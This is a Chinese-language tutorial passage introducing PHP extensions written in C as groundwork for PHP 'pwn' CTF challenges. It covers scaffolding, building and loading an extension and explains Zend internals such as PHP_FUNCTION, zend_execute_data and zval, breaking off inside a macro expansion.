<h1 id="a-php-extensions-for-c"><a class="markdownIt-Anchor" href="#a-php-extensions-for-c"></a> A. PHP extensions for C</h1>
<p>在查阅资料后可以发现，实际上PHP pwn考的还是用户态pwn。具体而言，赛题一般使用的都是使用C语言编写的PHP扩展库文件。</p>
<p>PHP是一门基于C语言编写的高级语言，历史悠久。它支持使用C语言编写可直接用于PHP文件的二进制.so库文件。具体操作如下：</p>
<h2 id="1-运行环境与工作目录初始化"><a class="markdownIt-Anchor" href="#1-运行环境与工作目录初始化"></a> 1. 运行环境与工作目录初始化</h2>
<p>为方便实验，这里可以基于PHP docker容器完成下面的操作。笔者使用的是php:8.1-apache，这个版本是php的较新版本，且内置apache服务器与PHP源码，可以开箱即用。</p>
<p>在容器的<code>/usr/src</code>目录中保存有php 8.1版本的源码压缩包，解压即可。</p>
<p>在源码目录的ext目录中有一个PHP脚本<code>ext_skel.php</code>，运行后可指定目录与脚本名，用于生成PHP扩展的基础文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">root@4bc0fa317dea:/usr/src/php-8.1.1/ext# ./ext_skel.php --help</span><br><span class="line">WHAT IT IS</span><br><span class="line"></span><br><span class="line">  It&#x27;s a tool for automatically creating the basic framework for a PHP extension.</span><br><span class="line"></span><br><span class="line">HOW TO USE IT</span><br><span class="line"></span><br><span class="line">  Very simple. First, change to the ext/ directory of the PHP sources. Then run</span><br><span class="line">  the following</span><br><span class="line"></span><br><span class="line">    php ext_skel.php --ext extension_name</span><br><span class="line"></span><br><span class="line">  and everything you need will be placed in directory ext/extension_name.</span><br><span class="line"></span><br><span class="line">  If you don&#x27;t need to test the existence of any external header files,</span><br><span class="line">  libraries or functions in them, the extension is ready to be compiled in PHP.</span><br><span class="line">  To compile the extension run the following:</span><br><span class="line"></span><br><span class="line">    cd extension_name</span><br><span class="line">    phpize</span><br><span class="line">    ./configure</span><br><span class="line">    make</span><br><span class="line"></span><br><span class="line">  Don&#x27;t forget to run tests once the compilation is done:</span><br><span class="line"></span><br><span class="line">    make test</span><br><span class="line"></span><br><span class="line">  Alternatively, to compile extension in the PHP:</span><br><span class="line"></span><br><span class="line">    cd /path/to/php-src</span><br><span class="line">    ./buildconf</span><br><span class="line">    ./configure --enable-extension_name</span><br><span class="line">    make</span><br><span class="line">    make test TESTS=ext/extension_name/tests</span><br><span class="line"></span><br><span class="line">  The definition of PHP_extension_NAME_VERSION will be present in the</span><br><span class="line">  php_extension_name.h and injected into the zend_extension_entry definition.</span><br><span class="line">  This is required by the PECL website for the version string conformity checks</span><br><span class="line">  against package.xml</span><br><span class="line"></span><br><span class="line">SOURCE AND HEADER FILE NAME</span><br><span class="line"></span><br><span class="line">  The ext_skel.php script generates &#x27;extension_name.c&#x27; and &#x27;php_extension_name.h&#x27;</span><br><span class="line">  as the main source and header files. Keep these names.</span><br><span class="line"></span><br><span class="line">  extension functions (User functions) must be named</span><br><span class="line"></span><br><span class="line">  extension_name_function()</span><br><span class="line"></span><br><span class="line">  When you need to expose extension functions to other extensions, expose</span><br><span class="line">  functions strictly needed by others. Exposed internal function must be named</span><br><span class="line"></span><br><span class="line">  php_extension_name_function()</span><br><span class="line"></span><br><span class="line">  See also CODING_STANDARDS.md.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line"></span><br><span class="line">  php ext_skel.php --ext &lt;name&gt; [--experimental] [--author &lt;name&gt;]</span><br><span class="line">                   [--dir &lt;path&gt;] [--std] [--onlyunix]</span><br><span class="line">                   [--onlywindows] [--help]</span><br><span class="line"></span><br><span class="line">  --ext &lt;name&gt;          The name of the extension defined as &lt;name&gt;</span><br><span class="line">  --experimental        Passed if this extension is experimental, this creates</span><br><span class="line">                        the EXPERIMENTAL file in the root of the extension</span><br><span class="line">  --author &lt;name&gt;       Your name, this is used if --std is passed and for the</span><br><span class="line">                        CREDITS file</span><br><span class="line">  --dir &lt;path&gt;          Path to the directory for where extension should be</span><br><span class="line">                        created. Defaults to the directory of where this script</span><br><span class="line">                        lives</span><br><span class="line">  --std                 If passed, the standard header used in extensions that</span><br><span class="line">                        is included in the core, will be used</span><br><span class="line">  --onlyunix            Only generate configure scripts for Unix</span><br><span class="line">  --onlywindows         Only generate configure scripts for Windows</span><br><span class="line">  --help                This help</span><br></pre></td></tr></table></figure>
<p>基本只需要使用<code>--ext</code>与<code>--dir</code>选项即可。这里笔者将脚本目录设置为<code>/var/www/my_extension</code>。</p>
<p>执行命令后，在<code>/var/www/my_extension</code>中自动生成了一些文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@4bc0fa317dea:/var/www/my_extension/hello_phpext# ls -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x 3 root root 4096 Jun 19 12:39 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Jun 19 12:36 ..</span><br><span class="line">-rw-r--r-- 1 root root  500 Jun 19 12:32 .gitignore</span><br><span class="line">-rw-r--r-- 1 root root 3490 Jun 19 12:32 config.m4</span><br><span class="line">-rw-r--r-- 1 root root  253 Jun 19 12:32 config.w32</span><br><span class="line">-rw-r--r-- 1 root root 1971 Jun 19 12:32 hello_phpext.c</span><br><span class="line">-rw-r--r-- 1 root root  110 Jun 19 12:32 hello_phpext.stub.php</span><br><span class="line">-rw-r--r-- 1 root root  558 Jun 19 12:32 hello_phpext_arginfo.h</span><br><span class="line">-rw-r--r-- 1 root root  372 Jun 19 12:32 php_hello_phpext.h</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jun 19 12:32 tests</span><br></pre></td></tr></table></figure>
<ul>
<li>config.m4：Unix下的Build Config配置文件，将通过它完成配置与安装。</li>
<li>hello_phpext.c：包含主要逻辑的C语言文件，我们扩展函数的保存位置。</li>
<li>php_hello_phpext.h：头文件，包含结构体定义等。</li>
</ul>
<h2 id="2-构建与加载"><a class="markdownIt-Anchor" href="#2-构建与加载"></a> 2. 构建与加载</h2>
<p>为方便后续对我们的扩展进行测试，首先需要搞清楚应该如何将扩展加载到PHP中。</p>
<p>使用下面的命令可以完成扩展加载：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>执行上述命令后，我们的PHP扩展库文件就被复制到了<code>/usr/local/lib/php/extensions/no-debug-non-zts-20210902</code>目录中。</p>
<p>随后，我们还需要修改<code>php.ini</code>文件。在8.1.1版本的PHP中，<code>/usr/local/etc/php</code>目录下有两个文件：<code>php.ini-development</code>与<code>php.ini-production</code>，前者一般用于开发调试而后者用于发布。这里使用前者，在代码中添加一行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=hello_phpext.so</span><br></pre></td></tr></table></figure>
<p>随后将其复制一份保存为php.ini，重启apache2服务，即可将我们的扩展加载到PHP中。</p>
<h2 id="3-关键结构定义"><a class="markdownIt-Anchor" href="#3-关键结构定义"></a> 3. 关键结构定义</h2>
<p>上述初始化操作完成后，hello_phpext.c中预先定义了一些必要的结构以及两个示例函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hello_phpext extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_hello_phpext.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hello_phpext_arginfo.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void test1() */</span></span><br><span class="line">PHP_FUNCTION(test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;hello_phpext&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string test2( [ string $var ] ) */</span></span><br><span class="line">PHP_FUNCTION(test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="type">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		Z_PARAM_OPTIONAL</span><br><span class="line">		<span class="title function_">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span><br><span class="line">	<span class="title function_">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION */</span></span><br><span class="line">PHP_RINIT_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLO_PHPEXT)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION */</span></span><br><span class="line">PHP_MINFO_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;hello_phpext support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; hello_phpext_module_entry */</span></span><br><span class="line">zend_module_entry hello_phpext_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;hello_phpext&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	ext_functions,					<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(hello_phpext),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(hello_phpext),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLO_PHPEXT_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_DL_HELLO_PHPEXT</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(hello_phpext)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>这里包含了大量PHP相关的宏定义，一眼看过去确实难以理解，下面将结合PHP源码进行分析。</p>
<h3 id="php_function"><a class="markdownIt-Anchor" href="#php_function"></a> <code>PHP_FUNCTION</code></h3>
<p>这是用于定义PHP库函数的宏定义，在8.1.1版本PHP源码中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h, line 71</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_NAMED_FUNCTION(name)		void ZEND_FASTCALL name(INTERNAL_FUNCTION_PARAMETERS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_FUNCTION(name)				ZEND_NAMED_FUNCTION(zif_##name)</span></span><br></pre></td></tr></table></figure>
<p>即上面的<code>PHP_FUNCTION(test1)</code>就相当于<code>void ZEND_FASTCALL test1(INTERNAL_FUNCTION_PARAMETERS)</code>。</p>
<h3 id="internal_function_parameters"><a class="markdownIt-Anchor" href="#internal_function_parameters"></a> <code>INTERNAL_FUNCTION_PARAMETERS</code></h3>
<p>上面的函数定义需要使用参数定义的相关宏定义<code>INTERNAL_FUNCTION_PARAMETERS</code>，它的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend.h, line 48</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERNAL_FUNCTION_PARAMETERS zend_execute_data *execute_data, zval *return_value</span></span><br></pre></td></tr></table></figure>
<p>即所有的PHP库函数都会通过第一个参数<code>execute_data</code>传入所有C函数需要的参数，由第二个参数<code>return_value</code>获取返回值，库函数本身的返回值恒为void。</p>
<h3 id="zend_execute_data等"><a class="markdownIt-Anchor" href="#zend_execute_data等"></a> <code>zend_execute_data</code>等</h3>
<p>这是一个结构体，用于保存C库函数的相关参数的数据结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_types.h, line 88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span>    <span class="title">zend_execute_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_compile.h, line 522</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> zend_op       *opline;           <span class="comment">/* executed opline                */</span></span><br><span class="line">	zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">	zval                *return_value;</span><br><span class="line">	zend_function       *func;             <span class="comment">/* executed function              */</span></span><br><span class="line">	zval                 This;             <span class="comment">/* this + call_info + num_args    */</span></span><br><span class="line">	zend_execute_data   *prev_execute_data;</span><br><span class="line">	zend_array          *symbol_table;</span><br><span class="line">	<span class="type">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line">	zend_array          *extra_named_params;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里引用了另外一些结构体，下面给出部分定义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_types.h, line 90</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span>     <span class="title">zval</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_types.h, line 288</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="type">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="type">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> w1;</span><br><span class="line">		<span class="type">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> type_info;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，PHP使用<code>zend_value</code>定义PHP数据类型，包括整数、浮点数、数组、对象、函数、类等。</p>
<h3 id="zend_parse_parameters_start等"><a class="markdownIt-Anchor" href="#zend_parse_parameters_start等"></a> <code>ZEND_PARSE_PARAMETERS_START</code>等</h3>
<p>在C库函数中，有一个重要的流程——解析PHP参数。从上面的示例C文件中，可以看到这样一段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">	Z_PARAM_OPTIONAL</span><br><span class="line">	<span class="title function_">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span><br><span class="line"><span class="title function_">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>
<p>这些宏定义均在<code>/Zend/zend_API.h</code>中定义，将这些宏全部展开带入参数之后，就变成了下面这个样子（已删除无效控制流）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ZEND_PARSE_PARAMETERS_START</span></span><br><span class="line"><span class="keyword">do</span> &#123; \</span><br><span class="line">		<span class="type">const</span> <span class="type">int</span> _flags = (<span class="number">0</span>); \</span><br><span class="line">		<span class="type">uint32_t</span> _min_num_args = (<span class="number">0</span>); \</span><br><span class="line">		<span class="type">uint32_t</span> _max_num_args = (<span class="type">uint32_t</span>) (<span class="number">1</span>); \</span><br><span class="line">		<span class="type">uint32_t</span> _num_args = (execute_data)-&gt;This.u2.num_args; \</span><br><span class="line">		<span class="type">uint32_t</span> _i = <span class="number">0</span>; \</span><br><span class="line">		zval *_real_arg, *_arg = <span class="literal">NULL</span>; \</span><br><span class="line">		zend_expected_type _expected_type = Z_EXPECTED_LONG; \</span><br><span class="line">		<span class="type">char</span> *_error = <span class="literal">NULL</span>; \</span><br><span class="line">		<span class="type">bool</span> _dummy = <span class="number">0</span>; \</span><br><span class="line">		<span class="type">bool</span> _optional = <span class="number">0</span>; \</span><br><span class="line">		<span class="type">int</span> _error_code = ZPP_ERROR_OK; \</span><br><span class="line">		((<span class="type">void</span>)_i); \</span><br><span class="line">		((<span class="type">void</span>)_real_arg); \</span><br><span class="line">		((<span class="type">void</span>)_arg); \</span><br><span class="line">		((<span class="type">void</span>)_expected_type); \</span><br><span class="line">		((<span class="type">void</span>)_error); \</span><br><span class="line">		((<span class="type">void</span>)_optional); \</span><br><span class="line">		((<span class="type">void</span>)_dummy); \</span><br><span class="line">		\</span><br><span class="line">		<span class="keyword">do</span> &#123; \</span><br><span class="line">			<span class="keyword">if</span> (UNEXPECTED(_num_args &lt; _min_num_args) || \</span><br><span class="line">			    UNEXPECTED(_num_args &gt; _max_num_args)) &#123; \</span><br><span class="line">				<span class="keyword">if</span> (!(_flags &amp; ZEND_PARSE_PARAMS_QUIET)) &#123; \</span><br><span class="line">					zend_wrong_parameters_count_error(_min_num_args, _max_num_args); \</span><br><span class="line">				&#125; \</span><br><span class="line">				_error_code = 